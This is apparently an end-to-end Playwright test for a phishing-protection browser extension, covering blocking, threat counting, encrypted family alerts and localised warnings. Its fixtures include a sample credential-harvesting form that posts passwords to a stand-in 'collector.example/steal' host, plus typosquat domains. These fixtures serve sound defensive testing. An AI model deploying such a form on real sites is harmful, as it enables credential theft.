#!/usr/bin/env node
/**
 * End-to-end test of the extension's background service worker in a real
 * Chromium, with the unpacked build loaded exactly as a user would load it.
 *
 * Run with:  node scripts/test-extension-sw.mjs [tree ...]
 *            (default trees: extension extension-safari)
 * Needs:     playwright + tweetnacl resolvable (repo node_modules, or NODE_PATH)
 *            and `npx playwright install chromium`.
 *
 * WHY THIS FILE EXISTS
 * --------------------
 * The background used to be a classic MV3 service worker that loaded its
 * helpers with import(). Service workers forbid import(); every call threw
 * "import() is disallowed on ServiceWorkerGlobalScope", and the try/catch
 * around each call swallowed it. So for every user, silently:
 *   - the threat counter was never sent,
 *   - Family Hub alerts were never encrypted and sent to relatives,
 *   - the Family Hub poller never ran (no alarm, no notifications),
 *   - the daily 30-day history prune promised in docs/PRIVACY.md never ran.
 * Unit tests could not see it: the code was fine, the runtime refused it.
 * Only a real browser can, so this test drives one.
 *
 * Once those paths ran, they had to run for the right things. The link scan
 * sends every link host on a page through the same check as the page itself,
 * so "dangerous" used to mean "blocked": links grandma never opened bumped
 * the account's threat counter and sent relatives "a scam site was blocked".
 * The pages below separate the two — a page that only LINKS to scams, a scam
 * page that is actually blocked, an offline guess, a stale family list.
 *
 * NO PRODUCTION TRAFFIC
 * ---------------------
 * A local mock API answers every call (api_url is pointed at it through the
 * same chrome.storage override the Options page uses), and Chromium's host
 * resolver maps *.cleanway.ai to nowhere, so a stray request fails instead of
 * reaching production. The test sites (*.example, *.tk, *.top) resolve to
 * the mock too; it serves the same pages on every hostname.
 *
 * The Safari tree is loaded into Chromium too: that cannot prove Safari's
 * runtime, but it does prove the Safari manifest + module graph load and run.
 * The Firefox tree is MV2 and Chromium no longer loads MV2; it is covered by
 * the static checks in scripts/test-extension-core.mjs.
 */
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { createRequire } from "node:module";
import { existsSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

// createRequire honours NODE_PATH, which CI uses to point at a throwaway install.
const require = createRequire(import.meta.url);
const { chromium } = require("playwright");
const nacl = require("tweetnacl");

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const TREES = process.argv.slice(2).length ? process.argv.slice(2) : ["extension", "extension-safari"];

const FAMILY_ID = "fam-e2e";
const DAY_MS = 24 * 60 * 60 * 1000;
const HOUR_MS = 60 * 60 * 1000;

// ── helpers ──

const b64url = (bytes) => Buffer.from(bytes).toString("base64url");
const fromB64url = (s) => new Uint8Array(Buffer.from(s, "base64url"));
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// Shaped like a Supabase access token: the extension reads its `sub` to know
// which family member is "me". Nothing checks the signature here.
const TOKEN = `e2e.${b64url(Buffer.from(JSON.stringify({ sub: "me" })))}.sig`;

async function until(what, fn, timeoutMs = 10000) {
  const deadline = Date.now() + timeoutMs;
  let last;
  while (Date.now() < deadline) {
    last = await fn();
    if (last) return last;
    await new Promise((r) => setTimeout(r, 150));
  }
  throw new Error(`timed out waiting for ${what}`);
}

function sealFor(recipientPub, senderKeys, payload) {
  const nonce = nacl.randomBytes(nacl.box.nonceLength);
  const ct = nacl.box(Buffer.from(JSON.stringify(payload)), nonce, recipientPub, senderKeys.secretKey);
  return { ciphertext_b64: b64url(ct), nonce_b64: b64url(nonce), sender_pubkey_b64: b64url(senderKeys.publicKey) };
}

function openFrom(envelope, recipientKeys) {
  const opened = nacl.box.open(
    fromB64url(envelope.ciphertext_b64),
    fromB64url(envelope.nonce_b64),
    fromB64url(envelope.sender_pubkey_b64),
    recipientKeys.secretKey,
  );
  return opened ? JSON.parse(Buffer.from(opened).toString("utf8")) : null;
}

// ── mock API ──

const PAGES = {
  "/credential-form.html":
    "<!doctype html><title>Sign in</title><form action=\"http://collector.example/steal\" method=\"post\">" +
    "<input type=\"text\" name=\"u\"><input type=\"password\" name=\"p\"><button>Sign in</button></form>",
  "/orphan-password.html":
    "<!doctype html><title>Verify</title><div id=\"trap\"><input type=\"email\">" +
    "<input type=\"password\"><span>Continue</span></div>",
  // A page someone READS: it links to scams, wrapped and unwrapped, but the
  // user opens none of them.
  "/links.html":
    "<!doctype html><title>Inbox</title><p>" +
    "<a id=\"l-scam\" href=\"http://scam-linked.example/win\">Prize</a> " +
    "<a id=\"l-guess\" href=\"http://paypa1-login.tk/\">Account</a> " +
    "<a id=\"l-wrapped\" href=\"https://www.google.com/url?q=http://scam-wrapped.example/&sa=D\">Search result</a> " +
    "<a id=\"l-hidden\" href=\"https://www.linkedin.com/slink?code=e2e\">Short link</a> " +
    "<a id=\"l-docs\" href=\"https://docs.google.com/forms/d/e/e2e/viewform\">Form</a></p>",
  // A sign-in form that posts to its own host: nothing for the form checks.
  "/landing.html":
    "<!doctype html><title>Sign in</title><form action=\"/login\" method=\"post\">" +
    "<input type=\"text\" name=\"u\"><input type=\"password\" name=\"p\"><button>Sign in</button></form>",
};

function startMockApi(family) {
  const calls = [];
  const state = { inbox: [] };
  const cors = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Headers": "Authorization, Content-Type",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  };
  const server = createServer((req, res) => {
    let raw = "";
    req.on("data", (c) => { raw += c; });
    req.on("end", () => {
      const url = new URL(req.url, "http://mock");
      const body = raw ? JSON.parse(raw) : null;
      if (req.method !== "OPTIONS") calls.push({ method: req.method, path: url.pathname, body, auth: req.headers.authorization });
      const json = (status, data) => {
        res.writeHead(status, { ...cors, "Content-Type": "application/json" });
        res.end(JSON.stringify(data));
      };
      if (req.method === "OPTIONS") { res.writeHead(204, cors); return res.end(); }
      if (PAGES[url.pathname]) {
        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
        return res.end(PAGES[url.pathname]);
      }
      const check = url.pathname.match(/^\/api\/v1\/public\/check\/(.+)$/);
      if (check) {
        const domain = decodeURIComponent(check[1]);
        // The shared per-IP limit a Tele2 user behind CGNAT hits.
        if (domain.includes("paypa1")) return json(429, { detail: "rate limited" });
        const scam = domain.startsWith("scam-");
        return json(200, scam
          ? { domain, score: 97, level: "dangerous", signals: ["Reported as phishing"], reason_codes: ["phishtank"] }
          : { domain, score: 2, level: "safe", signals: [], reason_codes: [] });
      }
      if (url.pathname === "/api/v1/user/threats/increment") return json(200, { threats_blocked_lifetime: 1 });
      if (url.pathname === "/api/v1/family/mine") {
        return json(200, { families: [{ family_id: FAMILY_ID, name: "E2E", role: "member", member_count: 2 }] });
      }
      if (url.pathname === `/api/v1/family/${FAMILY_ID}/members`) return json(200, { members: family.members });
      if (url.pathname === `/api/v1/family/${FAMILY_ID}/alerts`) {
        if (req.method === "POST") return json(200, { accepted: body.envelopes.length });
        return json(200, { alerts: state.inbox });
      }
      return json(404, { detail: "not mocked" });
    });
  });
  return new Promise((ok) => server.listen(0, "127.0.0.1", () => {
    ok({ server, calls, state, base: `http://127.0.0.1:${server.address().port}` });
  }));
}

// ── browser ──

// Russian first: most of our users are, and it proves the strings are not English.
const UI_LANG = "ru";

async function launch(tree, lang = UI_LANG) {
  const extPath = resolve(ROOT, tree);
  const userDir = mkdtempSync(join(tmpdir(), "cleanway-e2e-"));
  const context = await chromium.launchPersistentContext(userDir, {
    channel: "chromium",
    headless: true,
    locale: lang,
    // Linux Chromium reads its UI language from these, not from --lang.
    env: { ...process.env, LANGUAGE: lang, LANG: `${lang}_${lang.toUpperCase()}.UTF-8` },
    args: [
      `--disable-extensions-except=${extPath}`,
      `--load-extension=${extPath}`,
      `--lang=${lang}`,
      "--host-resolver-rules=MAP *.cleanway.ai ~NOTFOUND, MAP cleanway.ai ~NOTFOUND, " +
        "MAP *.example 127.0.0.1, MAP *.tk 127.0.0.1, MAP *.top 127.0.0.1",
    ],
  });
  let [sw] = context.serviceWorkers();
  if (!sw) sw = await context.waitForEvent("serviceworker", { timeout: 15000 });
  return { context, sw, extId: new URL(sw.url()).host, userDir };
}

function readCatalog(tree, locale) {
  return JSON.parse(readFileSync(resolve(ROOT, tree, "_locales", locale, "messages.json"), "utf8"));
}

// The catalog chrome.i18n actually serves. Chromium honours --lang/LANGUAGE on
// Linux, but on macOS it follows the system language list instead, so the
// test asks rather than assumes ("ru", "en_US", "pt_BR"... → our folder name).
async function activeCatalog(sw, tree) {
  const uiLocale = await sw.evaluate(() => chrome.i18n.getMessage("@@ui_locale"));
  const exact = uiLocale.replace("-", "_");
  const base = exact.split("_")[0];
  const locale = existsSync(resolve(ROOT, tree, "_locales", exact)) ? exact : base;
  return { locale, messages: readCatalog(tree, locale) };
}

async function sendCheck(page, domains) {
  return page.evaluate((d) => chrome.runtime.sendMessage({ type: "CHECK_DOMAINS", domains: d }), domains);
}

const posts = (api, path) => api.calls.filter((c) => c.method === "POST" && c.path === path);
const INCREMENT = "/api/v1/user/threats/increment";
const ALERTS = `/api/v1/family/${FAMILY_ID}/alerts`;

async function stats(sw) {
  const d = await sw.evaluate(() => chrome.storage.local.get("stats"));
  return { total_checks: 0, threats_blocked: 0, threats_warned: 0, ...(d.stats || {}) };
}

async function familyCache(sw, members, cachedAt) {
  await sw.evaluate(async (v) => {
    await chrome.storage.local.set({ family_cache: { family_id: v.familyId, members: v.members, cached_at: v.cachedAt } });
  }, { familyId: FAMILY_ID, members, cachedAt });
}

// The badge next to a link: its class list, or null for no badge at all.
async function badgeOf(tab, id) {
  return tab.evaluate((linkId) => {
    const next = document.getElementById(linkId).nextElementSibling;
    return next && next.classList.contains("ls-badge") ? [...next.classList] : null;
  }, id);
}

async function openBlocked(context, url) {
  const tab = await context.newPage();
  await tab.goto(url);
  await tab.waitForSelector("#ls-block-overlay", { timeout: 8000 });
  return tab;
}

async function seedHistory(sw, rows) {
  await sw.evaluate(async (records) => {
    const db = await new Promise((ok, fail) => {
      const req = indexedDB.open("cleanway", 1);
      req.onupgradeneeded = () => {
        const d = req.result;
        const store = d.createObjectStore("checks", { keyPath: "id", autoIncrement: true });
        store.createIndex("domain", "domain", { unique: false });
        store.createIndex("checked_at", "checked_at", { unique: false });
        store.createIndex("level", "level", { unique: false });
        d.createObjectStore("settings", { keyPath: "key" });
      };
      req.onsuccess = () => ok(req.result);
      req.onerror = () => fail(req.error);
    });
    const tx = db.transaction("checks", "readwrite");
    for (const r of records) tx.objectStore("checks").add(r);
    await new Promise((ok) => { tx.oncomplete = ok; });
    db.close();
  }, rows);
}

async function historyDomains(sw) {
  return sw.evaluate(() => new Promise((ok, fail) => {
    const req = indexedDB.open("cleanway", 1);
    req.onsuccess = () => {
      const all = req.result.transaction("checks").objectStore("checks").getAll();
      all.onsuccess = () => { ok(all.result.map((r) => r.domain).sort()); req.result.close(); };
      all.onerror = () => fail(all.error);
    };
    req.onerror = () => fail(req.error);
  }));
}

// ── the suite ──

async function runTree(tree) {
  const failures = [];
  let ok = 0;
  const check = async (name, fn) => {
    try { await fn(); ok++; console.log(`  ok    [${tree}] ${name}`); }
    catch (err) { failures.push(name); console.error(`  FAIL  [${tree}] ${name}\n        ${err && err.message}`); }
  };

  const me = nacl.box.keyPair();      // this browser's Family Hub keys
  const mom = nacl.box.keyPair();     // a relative in the same family
  const members = [
    { user_id: "me", public_key_b64: b64url(me.publicKey), role: "member" },
    { user_id: "mom", public_key_b64: b64url(mom.publicKey), role: "owner" },
  ];
  const api = await startMockApi({ members });
  const { context, sw, extId, userDir } = await launch(tree);

  try {
    await check("an anonymous install arms the history prune, not the family poll", async () => {
      const names = await until("alarms", async () => {
        const list = await sw.evaluate(() => chrome.alarms.getAll().then((a) => a.map((x) => x.name)));
        return list.includes("cleanway_history_prune") ? list : null;
      }, 5000);
      assert.ok(!names.includes("cleanway_family_poll"), `family poll armed for an anonymous user: ${names}`);
    });

    await sw.evaluate(async (cfg) => {
      await chrome.storage.local.set({
        api_url: cfg.base,
        auth_token: cfg.token,
        family_cache: { family_id: cfg.familyId, members: [{ user_id: "mom", public_key_b64: cfg.momPub }], cached_at: Date.now() },
        family_public_key_b64: cfg.myPub,
        family_secret_key_b64: cfg.mySec,
      });
    }, { base: api.base, token: TOKEN, familyId: FAMILY_ID, momPub: b64url(mom.publicKey), myPub: b64url(me.publicKey), mySec: b64url(me.secretKey) });

    await check("signing in with a family arms the family poll", async () => {
      await until("family poll alarm", () =>
        sw.evaluate(() => chrome.alarms.get("cleanway_family_poll").then(Boolean)), 5000);
    });

    const page = await context.newPage();
    await page.goto(`chrome-extension://${extId}/src/popup/welcome.html`);

    // The modules pick the new api_url up through storage.onChanged; probe
    // with fresh names until a check lands on the mock.
    let probe = 0;
    await until("api_url override to reach the background", async () => {
      await sendCheck(page, [`probe-${probe++}.example`]);
      return api.calls.some((c) => c.path.startsWith("/api/v1/public/check/probe-"));
    });

    await check("each host kind is routed right, and a dangerous verdict alone is not a block", async () => {
      const resp = await sendCheck(page, ["www.google.com", "sites.google.com", "forms.yandex.ru", "scam-e2e-2.wordpress.com"]);
      assert.equal(resp.results.length, 4);
      const asked = new Set(api.calls.map((c) => c.path));
      for (const host of ["www.google.com", "sites.google.com", "forms.yandex.ru"]) {
        assert.ok(!asked.has(`/api/v1/public/check/${host}`), `${host} should not need the API`);
      }
      for (const host of ["sites.google.com", "forms.yandex.ru"]) {
        const r = resp.results.find((x) => x.domain === host);
        assert.equal(r.level, "user_content", `${host}: anyone can publish there, so neither safe nor dangerous`);
      }
      const hosted = resp.results.find((r) => r.domain === "scam-e2e-2.wordpress.com");
      assert.ok(asked.has("/api/v1/public/check/scam-e2e-2.wordpress.com"), "a per-author subdomain goes to the API");
      assert.equal(hosted.level, "dangerous", "a scam on *.wordpress.com must not be 'known safe'");
      await sleep(800);
      assert.equal(posts(api, INCREMENT).length, 0, "a verdict is not a block: nothing may reach the account counter");
      assert.equal(posts(api, ALERTS).length, 0, "a verdict is not a block: nothing may reach the family");
    });

    await check("a page that only LINKS to scams blocks nothing and tells nobody", async () => {
      const reader = await context.newPage();
      await reader.goto(`http://reader.example:${new URL(api.base).port}/links.html`);
      for (const id of ["l-scam", "l-guess", "l-wrapped"]) {
        const cls = await until(`badge on #${id}`, () => badgeOf(reader, id));
        assert.ok(cls.includes("ls-dangerous"), `#${id}: ${cls}`);
      }
      const docs = await until("badge on #l-docs", () => badgeOf(reader, "l-docs"));
      assert.ok(docs.includes("ls-neutral"), `docs.google.com form: ${docs}`);
      assert.equal(await badgeOf(reader, "l-hidden"), null, "a redirector that hides its destination gets no badge");
      const asked = new Set(api.calls.map((c) => c.path));
      assert.ok(asked.has("/api/v1/public/check/scam-wrapped.example"), "the wrapped link is judged by its destination");
      assert.ok(!asked.has("/api/v1/public/check/www.google.com"), "…not by the Google wrapper");
      assert.ok(!asked.has("/api/v1/public/check/docs.google.com"), "user-content hosts are not sent to the API");
      await sleep(1200);
      assert.equal(posts(api, INCREMENT).length, 0, "links the user never opened reached the account counter");
      assert.equal(posts(api, ALERTS).length, 0, "links the user never opened reached the family");
      const st = await stats(sw);
      assert.equal(st.threats_blocked, 0, "a red badge is a warning, not a block");
      assert.ok(st.threats_warned >= 3, `warnings: ${st.threats_warned}`);
      await reader.close();
    });

    const port = new URL(api.base).port;
    let blockedTab;

    await check("opening a scam page blocks it, counts it once and tells the family once", async () => {
      blockedTab = await openBlocked(context, `http://scam-visit.example:${port}/landing.html`);
      const inc = await until("threat counter POST", async () => posts(api, INCREMENT)[0]);
      assert.deepEqual(inc.body, { count: 1 });
      assert.equal(inc.auth, `Bearer ${TOKEN}`);
      const sent = await until("family alerts POST", async () => posts(api, ALERTS)[0]);
      assert.equal(sent.body.envelopes.length, 1);
      const env = sent.body.envelopes[0];
      assert.equal(env.recipient_user_id, "mom");
      assert.equal(env.sender_pubkey_b64, b64url(me.publicKey));
      const alert = openFrom(env, mom);
      assert.ok(alert, "mom could not open the envelope");
      assert.equal(alert.domain, "scam-visit.example");
      assert.equal(alert.source, "api");
      assert.equal(alert.alert_type, "block");
      assert.ok(!JSON.stringify(sent.body).includes("scam-visit"), "domain must not travel in clear text");

      await blockedTab.reload();
      await blockedTab.waitForSelector("#ls-block-overlay", { timeout: 8000 });
      await sleep(1200);
      assert.equal(posts(api, INCREMENT).length, 1, "a reload is not a new blocked scam");
      assert.equal(posts(api, ALERTS).length, 1, "a reload must not alert the family again");
      assert.equal((await stats(sw)).threats_blocked, 1);
    });

    await check("the blocked page's own sign-in form gets the strict credential warning", async () => {
      const { messages } = await activeCatalog(sw, tree);
      const banner = await (await blockedTab.waitForSelector("#ls-credguard-banner", { state: "attached", timeout: 8000 }))
        .evaluate((el) => el.textContent);
      assert.ok(banner.includes(messages.credguard_page_flagged.message), `banner: ${banner}`);
      assert.ok(banner.includes(messages.credguard_banner_title.message), `full warning expected: ${banner}`);
      await blockedTab.close();
    });

    await check("an offline guess blocks the page but reaches neither the account nor the family", async () => {
      const tab = await openBlocked(context, `http://paypa1-login.tk:${port}/landing.html`);
      await sleep(1500);
      assert.equal(posts(api, INCREMENT).length, 1, "a guess from the offline scorer reached the account counter");
      assert.equal(posts(api, ALERTS).length, 1, "a guess from the offline scorer reached the family");
      assert.equal((await stats(sw)).threats_blocked, 2, "the block page WAS shown, so it counts on this device");
      await tab.close();
    });

    await check("a family list older than an hour is refreshed before alerting", async () => {
      await familyCache(sw, [], Date.now() - 2 * HOUR_MS);
      const minesBefore = api.calls.filter((c) => c.path === "/api/v1/family/mine").length;
      const tab = await openBlocked(context, `http://scam-stale.example:${port}/landing.html`);
      const sent = await until("alert after refresh", async () => posts(api, ALERTS)[1]);
      assert.ok(api.calls.filter((c) => c.path === "/api/v1/family/mine").length > minesBefore, "no refresh");
      assert.deepEqual(sent.body.envelopes.map((e) => e.recipient_user_id), ["mom"], "only relatives, never me");
      assert.equal(openFrom(sent.body.envelopes[0], mom).domain, "scam-stale.example");
      await tab.close();
    });

    await check("a lone weak sign on a sign-in page gets the calm warning", async () => {
      const { messages } = await activeCatalog(sw, tree);
      const tab = await context.newPage();
      await tab.goto(`http://cabinet.top:${port}/landing.html`);
      const banner = await (await tab.waitForSelector("#ls-credguard-banner", { timeout: 8000 })).innerText();
      assert.ok(banner.includes(messages.credguard_banner_title_weak.message), `calm title expected: ${banner}`);
      assert.ok(!banner.includes(messages.credguard_banner_title.message), `"scam site" title on one weak sign: ${banner}`);
      await tab.close();
    });

    await check("the daily prune deletes history older than 30 days and keeps the rest", async () => {
      const now = Date.now();
      await seedHistory(sw, [
        { domain: "old-40d.example", level: "safe", score: 0, reasons: [], checked_at: new Date(now - 40 * DAY_MS).toISOString() },
        { domain: "old-31d.example", level: "caution", score: 40, reasons: [], checked_at: new Date(now - 31 * DAY_MS).toISOString() },
        { domain: "fresh-1d.example", level: "safe", score: 0, reasons: [], checked_at: new Date(now - 1 * DAY_MS).toISOString() },
      ]);
      await sw.evaluate(() => chrome.alarms.create("cleanway_history_prune", { when: Date.now() + 200 }));
      const left = await until("prune", async () => {
        const d = await historyDomains(sw);
        return d.length === 1 ? d : null;
      });
      assert.deepEqual(left, ["fresh-1d.example"]);
    });

    await check("the Family Hub poller refreshes a stale family list and shows a relative's alert", async () => {
      await familyCache(sw, [], Date.now() - 2 * HOUR_MS);
      const minesBefore = api.calls.filter((c) => c.path === "/api/v1/family/mine").length;
      api.state.inbox = [{
        id: "alert-e2e-1",
        created_at: new Date().toISOString(),
        ...sealFor(me.publicKey, mom, { domain: "scam-for-grandma.example", level: "dangerous", alert_type: "block" }),
      }];
      await sw.evaluate(() => chrome.alarms.create("cleanway_family_poll", { when: Date.now() + 200 }));
      const shown = await until("family notification", async () => {
        const ids = await sw.evaluate(() => chrome.notifications.getAll().then((n) => Object.keys(n)));
        return ids.includes("cleanway-family:alert-e2e-1") ? ids : null;
      });
      assert.ok(shown);
      const seen = await sw.evaluate(() => chrome.storage.local.get("family_last_seen_alert_id"));
      assert.equal(seen.family_last_seen_alert_id, "alert-e2e-1");
      assert.ok(api.calls.filter((c) => c.path === "/api/v1/family/mine").length > minesBefore, "no refresh");
    });

    await check("family crypto still works in extension pages (Options path)", async () => {
      const roundTrip = await page.evaluate(async () => {
        const c = await import(chrome.runtime.getURL("src/utils/family-crypto.js"));
        const kp = await c.getOrCreateKeypair();
        const env = c.encryptForRecipient({ domain: "пример.рф", n: 1 }, kp.publicKeyB64, kp.secretKeyB64);
        return c.decryptForMe(env, kp.secretKeyB64);
      });
      assert.deepEqual(roundTrip, { domain: "пример.рф", n: 1 });
    });

    await check("content-script warnings come from the browser-language catalog, not English", async () => {
      const { locale, messages } = await activeCatalog(sw, tree);
      const english = readCatalog(tree, "en");
      assert.notEqual(locale, "en",
        "Chromium started in English, so this check would prove nothing; on macOS the extension follows the system language");
      const msg = (key) => messages[key].message;
      const tab = await context.newPage();
      await tab.goto(`${api.base}/credential-form.html`);
      const banner = await (await tab.waitForSelector("#ls-credguard-banner", { timeout: 8000 })).innerText();
      assert.ok(banner.includes(msg("credguard_banner_title")), `[${locale}] banner: ${banner}`);
      assert.ok(banner.includes(msg("credguard_dismiss")), `[${locale}] banner: ${banner}`);
      assert.ok(!banner.includes(english.credguard_banner_advice.message), `English left in banner: ${banner}`);
      // Enter in the password field, not a click: the fixed banner can sit
      // on top of this tiny page's button (it did on the Linux runner).
      await tab.press('input[type="password"]', "Enter");
      const modal = await (await tab.waitForSelector("#ls-credguard-modal", { timeout: 5000 })).innerText();
      for (const key of ["credguard_modal_title", "credguard_button_cancel", "credguard_button_override"]) {
        assert.ok(modal.includes(msg(key)), `[${locale}] modal lacks ${key}: ${modal}`);
      }
      assert.ok(!/credguard_|Submit anyway/.test(modal), `raw key or English in modal: ${modal}`);
      await tab.goto(`${api.base}/orphan-password.html`);
      const bar = await (await tab.waitForSelector("#cw-modern-phish-banner", { timeout: 8000 })).innerText();
      assert.ok(bar.includes(msg("mpg_orphan")), `[${locale}] modern-phish banner: ${bar}`);
      await tab.close();
      console.log(`        (content scripts rendered the "${locale}" catalog)`);
    });

    await check("the block page's evidence and the settings page come from the catalog, not English", async () => {
      const { locale, messages } = await activeCatalog(sw, tree);
      const english = readCatalog(tree, "en");
      const msg = (key) => messages[key].message;
      // The mock answers "phishtank" for scam-* hosts: one flagged_phishing card.
      const tab = await openBlocked(context, `http://scam-language.example:${port}/landing.html`);
      const card = await tab.innerText(".ls-block-evidence");
      assert.ok(card.includes(msg("reason_flagged_phishing")), `[${locale}] evidence title: ${card}`);
      assert.ok(card.includes(msg("evidence_flagged_phishing")), `[${locale}] evidence body: ${card}`);
      assert.ok(!card.includes("Reported as phishing") && !/Risk signal|PhishTank reported/.test(card),
        `English left on the block page: ${card}`);
      await tab.close();

      const opts = await context.newPage();
      await opts.goto(`chrome-extension://${extId}/src/options/options.html`);
      await until("settings page translated", async () => (await opts.title()) === msg("options_page_title"), 5000);
      // The empty family-invite dialog used to cover the whole page on open.
      assert.equal(await opts.isVisible("#family-invite-modal"), false, "invite dialog shown without an invite");
      const text = await opts.innerText("body");
      for (const key of ["options_protection", "options_skill_heading", "options_data", "stats_label_blocked"]) {
        assert.ok(text.includes(msg(key)), `[${locale}] settings page lacks ${key}`);
      }
      assert.ok(!text.includes(english.options_auto_scan_desc.message), `English left on the settings page`);
      await opts.close();
    });

    await check("signing out stops the family poll and forgets the family", async () => {
      await sw.evaluate(() => chrome.storage.local.remove("auth_token"));
      await until("family poll cleared", () =>
        sw.evaluate(() => chrome.alarms.get("cleanway_family_poll").then((a) => !a)), 5000);
      const left = await sw.evaluate(() => chrome.storage.local.get("family_cache"));
      assert.equal(left.family_cache, undefined);
    });
  } finally {
    await context.close();
    rmSync(userDir, { recursive: true, force: true });
    api.server.close();
  }
  return { ok, failures };
}

let totalOk = 0;
const allFailures = [];
for (const tree of TREES) {
  const { ok, failures } = await runTree(tree);
  totalOk += ok;
  allFailures.push(...failures.map((f) => `[${tree}] ${f}`));
}
console.log(allFailures.length === 0
  ? `\n${totalOk} browser checks passed (${TREES.join(", ")})`
  : `\n${allFailures.length} FAILED, ${totalOk} passed`);
process.exit(allFailures.length === 0 ? 0 : 1);
